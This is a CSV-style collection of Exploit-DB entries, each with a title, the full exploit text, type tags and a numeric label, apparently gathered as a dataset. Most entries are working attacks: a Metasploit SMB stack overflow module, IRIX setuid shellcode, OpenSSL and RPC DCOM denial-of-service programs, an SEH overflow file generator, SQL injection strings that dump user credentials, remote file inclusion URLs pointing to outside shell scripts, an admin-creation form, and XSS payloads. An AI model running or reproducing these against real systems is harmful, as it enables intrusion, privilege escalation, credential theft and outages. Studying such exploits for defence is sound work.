45770,"CdCatalog 2.3.1 - Denial of Service (PoC) # Exploit Title: CdCatalog 2.3.1 - Denial of Service (PoC) # Dork: N/A # Date: 2018-11-01 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://cdcat.sourceforge.net # Software Link: https://netcologne.dl.sourceforge.net/project/cdcat/cdcat/cdcat-2.3.1/cdcat-2.3.1.tar.bz2 # Version: 2.3.1 # Category: Dos # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # CTRL+O & File/Open/exp.hcf  #!/usr/bin/python      buffer = ""A"" * 21   payload = buffer try:     f=open(""exp.hcf"",""w"")     print ""[+] Creating %s bytes evil payload."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created.""",local,dos,1
34314,"Oracle Solaris Management Console - WBEM Insecure Temporary File Creation source: https://www.securityfocus.com/bid/41642/info  The 'Solaris Management Console' sub component of Oracle Solaris creates temporary files in an insecure manner.  An attacker with local access can exploit this issue to overwrite arbitrary files. This may result in denial-of-service conditions or could aid in other attacks.  Solaris 9 and 10 are affected.     $ id    uid=101(fstuart) gid=14(sysadmin)    $ cd /tmp    $ x=0    $ while [ ""$x"" -ne 30000 ] ;do    > ln -s /etc/important /tmp/dummy.$x    > x=$(expr ""$x"" + 1)    > done    $ ls -dl /etc/important    -rw-r--r--   1 root     root          38 Jan  3 22:43 /etc/important    $ cat /etc/important       This is an important file!        EOF",local,local,1
1571,"JiRos Banner Experience 1.0 - Unauthorized Create Admin <html> <title>Jiros Banner Experience Pro Unauthorized Admin Add Exploit</title> <body bgcolor=""#000000""> <style> .xpl {font-family:tahoma; font-size:11px; text-decoration: none;} </style> <script language=""JavaScript""> function jbxpl() {   if (document.xplt.victim.value=="""") {     alert(""Please enter site!"");     return false;   }   if (confirm(""Are you sure?"")) {     xplt.action=""http://""+document.xplt.victim.value+""files/update.asp?Action=AddAdmin"";     xplt.aName.value=document.xplt.aName.value;     xplt.aEmail.value=document.xplt.aEmail.value;     xplt.aPassword.value=document.xplt.aPassword.value;     xplt.aIsSystemAdmin=document.xplt.aIsSystemAdmin.value;     xplt.aIsActive=document.xplt.aIsActive.value;     xplt.submit();   } } </script> <strong> <font class=""xpl"" color=""#00FF40""> <pre> <center> Welcome to Jiros Banner Experience Pro Unauthorized Admin Add Exploit This exploit has been coded by nukedx You can found original advisory on http://www.nukedx.com/?viewdoc=19 Dork for this exploit: <u>inurl:JBSPro</u> Your target must be like that: www.victim.com/Path/ The sites you found with given dork has like: www.victim.com/JBSPro/files or www.victim.com/JBSPro.asp If the site has /JBSPro/files in link your target must be www.victim.com/JBSPro/ For second example your target must be www.victim.com/ You can login with your admin account via www.victim.com/JBSPath/files/login.asp Have phun <form name=""xplt"" method=""POST"" onsubmit=""jbxpl();""> Target -> <input type=""text"" name=""victim"" value=""www.victim.com/Path/"" size=""44"" class=""xpl""> <input type=""text"" name=""aName"" value=""Enter Username"" class=""xpl"" size=""30""> <input type=""text"" name=""aEmail"" value=""Enter Email"" class=""xpl"" size=""30""> <input type=""text"" name=""aPassword"" value=""Enter Password"" class=""xpl"" size=""30""> <input type=""hidden"" name=""aIsSystemAdmin"" value=""True""> <input type=""hidden"" name=""aIsActive"" value=""True""> <input type=""submit"" value=""Send"" class=""xpl""> </form> </pre> </font> </strong> </body> </html>  Save this code as .htm and then execute.  # nukedx.com [2006-03-07]  # milw0rm.com [2006-03-09]",remote,webapps,1
9932,"Novell NetWare 6.5 SP2-SP7 - LSASS CIFS.NLM Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to  # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::DCERPC 	include Msf::Exploit::Remote::SMB   	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'Novell NetWare LSASS CIFS.NLM Driver Stack Overflow', 			'Description'    => %q{ 				This module exploits a stack overflow in the NetWare CIFS.NLM driver. 				Since the driver runs in the kernel space, a failed exploit attempt can 				cause the OS to reboot. 			}, 			'Author'         =>  				[ 					'toto', 				], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision$', 			'References'     => 				[ 					[ 'OSVDB', '12790' ], 				], 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 400, 					'BadChars' => ""\x00"", 				}, 			'Platform'       => 'netware', 			'Targets'        =>  				[ 					# NetWare SP can be found in the SNMP version : 					# 5.70.07 -> NetWare 6.5 (5.70) SP7 (07)  					[ 'VMware',   { 'Ret' => 0x000f142b } ], 					[ 'NetWare 6.5 SP2', { 'Ret' => 0xb2329b98 } ], # push esp - ret (libc.nlm) 					[ 'NetWare 6.5 SP3', { 'Ret' => 0xb234a268 } ], # push esp - ret (libc.nlm) 					[ 'NetWare 6.5 SP4', { 'Ret' => 0xbabc286c } ], # push esp - ret (libc.nlm) 					[ 'NetWare 6.5 SP5', { 'Ret' => 0xbabc9c3c } ], # push esp - ret (libc.nlm) 					[ 'NetWare 6.5 SP6', { 'Ret' => 0x823c835c } ], # push esp - ret (libc.nlm) 					[ 'NetWare 6.5 SP7', { 'Ret' => 0x823c83fc } ], # push esp - ret (libc.nlm) 				],  			'DisclosureDate' => 'Jan 21 2007')) 			 		register_options( 			[ 				OptString.new('SMBPIPE', [ true,  ""The pipe name to use (LSARPC)"", 'lsarpc']) 			], self.class) 						 	end  	def exploit	 		 		# Force multi-bind off (netware doesn't support it) 		datastore['DCERPC::fake_bind_multi'] = false 		 		connect() 		smb_login()  		handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [""\\#{datastore['SMBPIPE']}""]) 		 		print_status(""Binding to #{handle} ..."") 		dcerpc_bind(handle) 		print_status(""Bound to #{handle} ..."")  		stb = 			NDR.long(rand(0xffffffff)) + 			NDR.UnicodeConformantVaryingString(""\\\\#{datastore['RHOST']}"") + 			NDR.long(0) + 			NDR.long(0) + 			NDR.long(0) + 			NDR.long(0) + 			NDR.long(0) + 			NDR.long(0) + 			NDR.long(0x000f0fff)  		resp = dcerpc.call(0x2c, stb) 		handle, = resp[0,20] 		code, = resp[20, 4].unpack('V')  		name = 			rand_text_alphanumeric(0xa0) + 			[target.ret].pack('V') + 			payload.encoded  		stb =  			handle + 			NDR.long(1) + 			NDR.long(1) +  			NDR.short(name.length) + 			NDR.short(name.length) + 			NDR.long(rand(0xffffffff)) +  			NDR.UnicodeConformantVaryingStringPreBuilt(name) +  			NDR.long(0) + 			NDR.long(0) + 			NDR.long(1) + 			NDR.long(0)   		print_status(""Calling the vulnerable function ..."") 		 		begin 			dcerpc.call(0x0E, stb) 		rescue 		end  		# Cleanup 		handler 		disconnect 	end  end",remote,remote,1
44655,"SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion # Title: SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion # Application:SAP B2B OR B2C is CRM # Versions Affected: SAP B2B OR B2C is CRM 2.x 3.x and 4.x with Bakend R/3 (to icss_b2b) # Vendor URL: http://SAP.com # Bugs: SAP LFI in B2B OR B2C CRM # Sent:  2018-05-03 # Reported:  2018-05-03 # Date of Public Advisory: 2018-02-09 # Reference: SAP Security Note 1870255656 # Author: Richard Alviarez  # 1. VULNERABLE PACKAGES # SAP LFI in B2B OR B2C CRM v2.x to 4.x # Other versions are probably affected too, but they were not checked.  # 2. TECHNICAL DESCRIPTION # A possible attacker can take advantage of this vulnerability  # to obtain confidential information of the platform,  # as well as the possibility of writing in the logs of the # registry in order to get remote execution of commands and take control of the system.   # 3. Steps to exploit this vulnerability  A. Open https://SAP/{name}_b2b/initProductCatalog.do?forwardPath=/WEB-INF/web.xml  Other vulnerable parameters:  https://SAP/{name}_b2b/CatalogClean.do?forwardPath=/WEB-INF/web.xml https://SAP/{name}_b2b/IbaseSearchClean.do?forwardPath=/WEB-INF/web.xml https://SAP/{name}_b2b/ForwardDynamic.do?forwardPath=/WEB-INF/web.xml page on SAP server  B. Change parameter {name} for example icss_b2b or other name....  C. Change ""/WEB-INF/web.xml"" for other files or archives internal.   # 4. Collaborators # - CuriositySec # - aDoN90 # - Vis0r",remote,webapps,1
36280,"Symphony 2.2.3 - '/symphony/publish/images?filter' Cross-Site Scripting source: https://www.securityfocus.com/bid/50470/info  Symphony is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Symphony versions prior to 2.2.4 are vulnerable.   http://example.com/symphony/publish/images/?filter='""--></style></script><script>alert(1)</script>",remote,webapps,1
61,"Microsoft Windows Server 2000 - RPC DCOM Interface Denial of Service // This is a new unpatched vulnerability - NOT the MS03-026  #include <winsock2.h> #include <stdio.h> #include <windows.h> #include <process.h> #include <string.h> #include <winbase.h>  unsigned char bindstr[]={ 0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00, 0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00, 0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46, 0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00, 0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};  unsigned char request[]={ 0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00, 0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00, 0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31, 0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};    void main(int argc,char ** argv) {     WSADATA WSAData;  int i;     SOCKET sock;     SOCKADDR_IN addr_in;    short port=135;  unsigned char buf1[0x1000];  printf(""RPC DCOM DOS Vulnerability discoveried by Xfocus.org\n"");  printf(""Code by FlashSky,Flashsky xfocus org,benjurry,benjurry xfocus org\n"");  printf(""Welcome to http://www.xfocus.net\n"");  if(argc<2)  {   printf(""useage:%s target\n"",argv[0]); exit(1);  }       if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)     {         printf(""WSAStartup error.Error:%d\n"",WSAGetLastError());         return;     }      addr_in.sin_family=AF_INET;     addr_in.sin_port=htons(port);     addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)     {         printf(""Socket failed.Error:%d\n"",WSAGetLastError());         return;     }  if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)  {   printf(""Connect failed.Error:%d"",WSAGetLastError());   return;  }  if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)  {    printf(""Send failed.Error:%d\n"",WSAGetLastError());    return;  }   i=recv(sock,buf1,1024,MSG_PEEK);  if (send(sock,request,sizeof(request),0)==SOCKET_ERROR)  {    printf(""Send failed.Error:%d\n"",WSAGetLastError());    return;  }  i=recv(sock,buf1,1024,MSG_PEEK); }    // milw0rm.com [2003-07-21]",local,dos,0
3935,Glossword 1.8.1 - 'custom_vars.php' Remote File Inclusion GlossWord v1.8  ÅŸu script deÄŸil ! --> http://glossword.info/ !  Site : http://sourceforge.net/projects/glossword/  Author : BeyazKurt - B3yazKurt@Hotmail.Com     kimse ÅŸeyimde deÄŸil !  Download : http://sourceforge.net/projects/glossword/  include_once($sys['path_addon'].'/multilingual_vars.php');  [path]/custom_vars.php?sys[path_addon]=EvilC0de  # milw0rm.com [2007-05-16],remote,webapps,1
36379,"OrangeHRM 2.6.11 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/50857/info  OrangeHRM is prone to an SQL-injection and multiple cross-site scripting vulnerabilities.  Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  OrangeHRM 2.6.11 is vulnerable; prior versions may also be affected.   http://www.example.com/index.php?menu_no_top=eim&uniqcode=%22%3E%3C/iframe%3E%3Cscript%3Ealert%28123%29;% 3C/script%3E  http://www.example.com/index.php?menu_no_top=eim&uniqcode=USR&isAdmin=%22%3E%3C/iframe%3E%3Cscript%3E alert%28123%29;%3C/script%3E",remote,webapps,1
29416,Magic Photo Storage Website - '/admin/membership_pricing.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info           Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.           Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/admin/membership_pricing.php?_config[site_path]=http://www.example2.com,remote,webapps,1
7444,"Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion [START]  ######################################################################################### [0x01] Informations:  Script         : Simple Text-File Login script 1.0.6 Download       : http://www.hotscripts.com/jump.php?listing_id=36777&jump_type=1 Vulnerability  : Remote File Inclusion / Sensitive Data Disclosure Author         : Osirys Contact        : osirys[at]live[dot]it Notes          : Proud to be Italian Greets:        : XaDoS, x0r, emgent, Jay Notes          : *  * The name of this login system is Simple Text-File Login script, so we can already    understand that this script will use a .txt file to do his job. So it's like if   the coder didn't think that a login system like this isn't vulnerable. Weird !   Anyway, it's vulnerable to Remote File Inclusion also, here we are !  ######################################################################################### [0x02] Bug:[Remote File Inclusion] ######  Bugged file is: /[path]/slogin_lib.inc.php  [CODE] 90.  if (!isset ($slogin_path)) { 91.    $slogin_path = """"; 92. } [/CODE]  If $slogin_path is not given, becomes a null variable. Scrolling down the source code, you can see an include of that variable everywhere. Just one of the few vulnerable includes:  [CODE] include_once ($slogin_path . ""header.inc.php""); [/CODE]  FIX: Just declare $slogin_path. An example of a bugged inclusion in the source is this:  [CODE] include_once ($slogin_path . ""header.inc.php""); [/CODE]  The header.inc.php file, such as all the files of this cms, is in the same dir of slogin_lib.inc.php, so a fix could be just to include the file, without including a variable, which should be null becouse all the files are in the same dir.  [CODE] include_once (""header.inc.php""); # <-- This is a secure include. [/CODE]   [!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]  ######################################################################################## [0x03] Bug:[Sensitive Data Disclosure] ######  * As I already said, this is not a real bug, becouse is the intention of the author   to use a .txt file as a login storage. But it's weird, it's unsecure ! Maybe he just    sees the goodness of people (hehe xD)  In this login system, sensible datas like username and password are stored in a local text file , so we can get sensitive information just going to this txt file . The name of this file is set in slogin_lib.inc.php. By default is: slog_users.txt  [!] EXPLOIT: /[path]/slog_users.txt  #########################################################################################  [/END]  # milw0rm.com [2008-12-14]",remote,webapps,1
20138,"IRIX 5.3/6.x - '/usr/bin/mail' Local Buffer Overflow /* source: https://www.securityfocus.com/bid/1542/info  The mail(1) program, also know as mail_att, is used to read or send email. A buffer overflow condition exists in code that handles the LOGNAME environment variable. This could be exploited to elevate privileges.  */  /*## copyright LAST STAGE OF DELIRIUM sep 1997 poland        *://lsd-pl.net/ #*/ /*## /usr/bin/mail                                                           #*/  #define ADRNUM 228 #define PCHNUM 440 #define TMPNUM 228 #define NOPNUM 5000 #define ALLIGN 3  char setreuidcode[]=     ""\x30\x0b\xff\xff""    /* andi    $t3,$zero,0xffff     */     ""\x24\x02\x04\x01""    /* li      $v0,1024+1           */     ""\x20\x42\xff\xff""    /* addi    $v0,$v0,-1           */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""\x30\x44\xff\xff""    /* andi    $a0,$v0,0xffff       */     ""\x31\x65\xff\xff""    /* andi    $a1,$t3,0xffff       */     ""\x24\x02\x04\x64""    /* li      $v0,1124             */     ""\x03\xff\xff\xcc""    /* syscall                      */ ;  char shellcode[]=     ""\x04\x10\xff\xff""    /* bltzal  $zero,<shellcode>    */     ""\x24\x02\x03\xf3""    /* li      $v0,1011             */     ""\x23\xff\x01\x14""    /* addi    $ra,$ra,276          */     ""\x23\xe4\xff\x08""    /* addi    $a0,$ra,-248         */     ""\x23\xe5\xff\x10""    /* addi    $a1,$ra,-240         */     ""\xaf\xe4\xff\x10""    /* sw      $a0,-240($ra)        */     ""\xaf\xe0\xff\x14""    /* sw      $zero,-236($ra)      */     ""\xa3\xe0\xff\x0f""    /* sb      $zero,-241($ra)      */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""/bin/sh"" ;  char jump[]=     ""\x03\xa0\x10\x25""    /* move    $v0,$sp              */     ""\x03\xe0\x00\x08""    /* jr      $ra                  */ ;  char nop[]=""\x24\x0f\x12\x34"";  main(int argc,char **argv){     char buffer[10000],adr[4],pch[4],tmp[4],*b,*envp[3];     int i;      printf(""copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n"");     printf(""/usr/bin/mail for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n"");      *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10264+2500+228+228;     *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10264+112+32356;     *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10264+7000;      envp[0]=buffer;     envp[1]=&buffer[8000];     envp[2]=0;      b=buffer;     sprintf(b,""xxx="");     b+=4;     for(i=0;i<ADRNUM;i++) *b++=adr[i%4];     for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i];      for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];      *b=0;      b=&buffer[8000];     sprintf(b,""LOGNAME="");     b+=8;     for(i=0;i<ALLIGN;i++) *b++=0xff;     for(i=0;i<PCHNUM;i++) *b++=pch[i%4];     *b=0;      execle(""/usr/bin/mail"",""lsd"",0,envp); }",local,local,1
5335,"Mambo Component Ahsshop 1.51 - 'vara' SQL Injection ########################################## # # Mambo Component com_ahsshop SQL Injection # ########################################## # ##AUTHOR : S@BUN # ####HOME : http://www.milw0rm.com/author/1334 # ####BLOG : http://my.opera.com/SQL-Injection/blog/ # ####MAiL : hackturkiye.hackturkiye@gmail.com # ########################################### # # DORK 1 : allinurl: ""com_ahsshop""do=default # ########################################### EXPLOiT 1 :  index.php?option=com_ahsshop&do=default&vara=-99999/**/union/**/select/**/0,concat(username,0x3a,password),0x3a,3,4,0x3a,6,0x3a/**/from/**/mos_users/*  EXPLOiT 2 :  index.php?option=com_ahsshop&do=default&vara=-99999/**/union/**/select/**/concat(username,0x3a,password),1/**/from/**/mos_users/*   ########################################### ------------------S@BUN-------------------# ########################################### -----hackturkiye.hackturkiye@gmail.com----# ########################################### --http://my.opera.com/SQL-Injection/blog/-# ###########################################  side note: 	<name>ahsshop</name> 	<creationDate>15.07.2004</creationDate> 	<author>Arnï¿½r Heiï¿½ar fyrir Netvistun ehf.</author> 	<copyright>Allur hï¿½fundarrï¿½ttur ï¿½skilinn</copyright> 	<authorEmail>arnor@netvistun.is</authorEmail>  	<authorUrl>www.netvistun.is</authorUrl> 	<version>1.51</version> 	<description>Kerfi ï¿½tlaï¿½ til aï¿½ kynna vï¿½rur og vï¿½ruflokka eftir verï¿½um</description>  # milw0rm.com [2008-04-01]",remote,webapps,1
12334,"OpenSSL - Remote Denial of Service /***********************************************************  * hoagie_openssl_record_of_death.c  * OPENSSL REMOTE DENIAL-OF-SERVICE EXPLOIT   * - OpenSSL 0.9.8m (short = 16 bit)  * - OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)  *  * CVE-2010-0740  *  * Bug discovered by:  * Bodo Moeller and Adam Langley (Google)  * Philip Olausson <po@secweb.se>  * http://openssl.org/news/secadv_20100324.txt  *  * The main problem is in ssl/t1_enc.c => tls1_mac() function  *  * - OpenSSL 0.9.8m  *         if (ssl->version == DTLS1_BAD_VER ||  *           (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER))  *               {  *               unsigned char dtlsseq[8],*p=dtlsseq;  *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);  *  * - OpenSSL 0.9.8f - 0.9.8n  *         if (ssl->version == DTLS1_VERSION && ssl->client_version != DTLS1_BAD_VER)  *               {  *               unsigned char dtlsseq[8],*p=dtlsseq;  *  *               s2n(send?ssl->d1->w_epoch:ssl->d1->r_epoch, p);  *  * There is a NULL pointer dereference => ssl->d1 because d1 is only initialized in  * ssl/d1_lib.c => dtls1_new(). So if you use SSLv23_server_method() or   * TLSv1_server_method() this variable will be NULL.  *  * If the patch (see http://openssl.org/news/secadv_20100324.txt) is not applied  * its possible to set the version to DTLS1_BAD_VER (0x100) or DTLS_VERSION (0xfeff)  * and transmit the packet to the server or client to trigger the vulnerability.  *  * When you are using OpenSSL 0.9.8m you can send DTLS1_BAD_VER because 0x100 is not   * a problem with signed/unsigned.  *  * If you are using OpenSSL 0.9.8f to 0.9.8n you have to trigger the vulnerability  * via DTLS1_VERSION. In that case version will be 0xfffffeff. So it doesnt work  * if DTLS1_VERSION is 16 bit.  *  * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-  * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY  * DAMAGE DONE USING THIS PROGRAM.  *  * VOID.AT Security  * andi@void.at  * http://www.void.at  *  ************************************************************/ #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> #include <netdb.h> #include <time.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <openssl/ssl.h>  /* usage  * display help screen  */ void usage(int argc, char **argv) {    fprintf(stderr,            ""usage: %s [-h] [-v] [-d <host>] [-p <port>]\n""            ""\n""            ""-h        help\n""            ""-v        verbose\n""            ""-d host   SSL server\n""            ""-p port   SSL port\n""            ""-t target\n""            ""   0 ... OpenSSL 0.9.8m (short = 16 bit) - default\n""            ""   1 ... OpenSSL 0.9.8f through 0.9.8m (short != 16 bit)\n""            ,            argv[0]);    exit(1); }  /* connect_to  * connect to remote http server  */ int connect_to(char *host, int port) {    struct sockaddr_in s_in;    struct hostent *he;    int s;     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {       return -1;    }     memset(&s_in, 0, sizeof(s_in));    s_in.sin_family = AF_INET;    s_in.sin_port = htons(port);     if ( (he = gethostbyname(host)) != NULL)        memcpy(&s_in.sin_addr, he->h_addr, he->h_length);    else {        if ( (s_in.sin_addr.s_addr = inet_addr(host) ) < 0) {           return -3;        }    }     if (connect(s, (struct sockaddr *)&s_in, sizeof(s_in)) == -1) {       return -4;    }     return s; }  /* ssl_connect_to  * establish ssl connection over tcp connection  */ SSL *ssl_connect_to(int s) {    SSL *ssl;    SSL_CTX *ctx;    BIO *sbio;    SSL_METHOD *meth;     CRYPTO_malloc_init();    SSL_load_error_strings();    SSL_library_init();     // meth = TLSv1_client_method();    meth = SSLv23_client_method();    ctx = SSL_CTX_new(meth);    ssl = SSL_new(ctx);    sbio = BIO_new_socket(s, BIO_NOCLOSE);    SSL_set_bio(ssl, sbio, sbio);     if (SSL_connect(ssl) <= 0) {       return NULL;    }     return ssl; }   int main(int argc, char **argv) {    struct sockaddr_in s_in;    struct hostent *he;    char data[1024];     int s;    int target = 0;    char c;    char *destination = NULL;    int port = 0;    SSL *ssl = NULL;     fprintf(stderr,            ""hoagie_openssl_record_of_death.c - openssl ssl3_get_record() remote\n""            ""-andi / void.at\n\n"");     if (argc < 2) {       usage(argc, argv);    } else {       while ((c = getopt (argc, argv, ""hd:p:t:"")) != EOF) {          switch (c) {             case 'h':                  usage(argc, argv);                  break;             case 'd':                  destination = optarg;                  break;             case 'p':                  port = atoi(optarg);                  break;             case 't':                  target = atoi(optarg);                  break;          }       }        if (!destination || !port) {          fprintf(stderr, ""[*] destination and/or port missing\n"");       } else if (target && target != 1) {          fprintf(stderr, ""[*] invalid target '%d'\n"", target);       } else {          s = connect_to(destination, port);          if (s > 0) {             fprintf(stderr, ""[+] tcp connection to '%s:%d' successful\n"", destination, port);             ssl = ssl_connect_to(s);             if (ssl) {                fprintf(stderr, ""[+] ssl connection to '%s:%d' successful\n"", destination, port);                snprintf(data, sizeof(data), ""GET / HTTP/1.0\r\n\r\n"");                 fprintf(stderr, ""[+] sending first packet ...\n"");                SSL_write(ssl, data, strlen(data));                 if (!target) {                   ssl->version = DTLS1_BAD_VER;                } else {                   ssl->version = DTLS1_VERSION;                }                 fprintf(stderr, ""[+] sending second paket ...\n"");                SSL_write(ssl, data, strlen(data));                 SSL_shutdown(ssl);                close(s);                 sleep(1);                 s = connect_to(destination, port);                if (s > 0) {                   fprintf(stderr, ""[-] exploit failed\n"");                   close(s);                } else {                   fprintf(stderr, ""[+] exploit successful\n"");                }             } else {                fprintf(stderr, ""[-] ssl connection to '%s:%d' failed\n"", destination, port);             }          } else {             fprintf(stderr, ""[-] tcp connection to '%s:%d' failed\n"", destination, port);          }       }    }        return 0; }",remote,dos,1
2461,"VAMP Webmail 2.0beta1 - 'yesno.phtml' Remote File Inclusion ###### ToXiC ######################### # #VAMP Webmail Remote File Inclusion by ToXiC CreW # #BuG FounD by Drago84 # #Application Affect:VAMP Webmail # #Page: #     yesno.phtml #Dir : #     /setup/ # #Problem: #        <?if($answer==""Yes"") { #         include $yes_url; #         } else { #        include $no_url; #         }?> # ExPloit : #http://www.site.com/wamp_dir/setup/yesno.phtml?no_url=http://sonic-banda-di-lamer.gay/shell.php? # #         GrEatZ All Member of ToXiC, Str0ke # # #FUCK #Sonic # # ToXic Security Italian CreW ###### ToXiC ##########  # milw0rm.com [2006-09-30]",remote,webapps,1
29966,Campsite 2.6.1 - 'Alias.php?g_documentRoot' Remote File Inclusion source: https://www.securityfocus.com/bid/23874/info  Campsite is prone to multiple remote file-include vulnerabilities.  Exploiting this issue allows remote attackers to execute code in the context of the webserver.  This issue affects Campsite 2.6.1. Earlier versions may also be affected.  http://www.example.com/classes/Alias.php?g_DocumentRoot=shell.txt?,remote,webapps,1
18657,"mmPlayer 2.2 - '.ppl' Local Buffer Overflow (SEH) #!/usr/bin/perl # Title: mmPlayer 2.2 (.ppl) Local Buffer Overflow Exploit (SEH) # Date: 23.03.2012 # Author: RjRjh Hack3r # Software Link: http://www.brnameg.com/download.php?id=3859 # Tested on: Windows XP SP2 (EN)  my $file= ""RjRjh.ppl""; my $junk= ""\x41"" x 4090; my $next_seh= ""\xEB\x06\x90\x90""; my $seh= ""\x23\xC0\xB4\x76""; # pop/pop/ret 0x76B4C023 (winmm.dll) EBX my $nop = ""\x90"" x 20;  # calc.exe my $buf = ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"". ""\x42\x30\x42\x30\x42\x30\x4b\x48\x45\x34\x4e\x53\x4b\x48\x4e\x47"". ""\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x34\x4a\x41\x4b\x58"". ""\x4f\x35\x42\x32\x41\x30\x4b\x4e\x49\x34\x4b\x38\x46\x33\x4b\x38"". ""\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"". ""\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x33\x46\x55\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x58"". ""\x4f\x55\x46\x32\x41\x30\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"". ""\x4b\x38\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x48"". ""\x41\x30\x4b\x4e\x49\x38\x4e\x55\x46\x42\x46\x50\x43\x4c\x41\x43"". ""\x42\x4c\x46\x56\x4b\x58\x42\x54\x42\x53\x45\x48\x42\x4c\x4a\x47"". ""\x4e\x30\x4b\x48\x42\x34\x4e\x30\x4b\x38\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x58\x4a\x46\x4a\x30\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b"". ""\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x46\x4e\x43\x4f\x45\x41\x53"". ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37"". ""\x42\x45\x4a\x56\x42\x4f\x4c\x38\x46\x50\x4f\x35\x4a\x56\x4a\x59"". ""\x50\x4f\x4c\x48\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x36"". ""\x4e\x36\x43\x36\x42\x50\x5a""; open($File,"">$file""); print $File $junk.$next_seh.$seh.$nop.$buf; close($File);",local,local,1
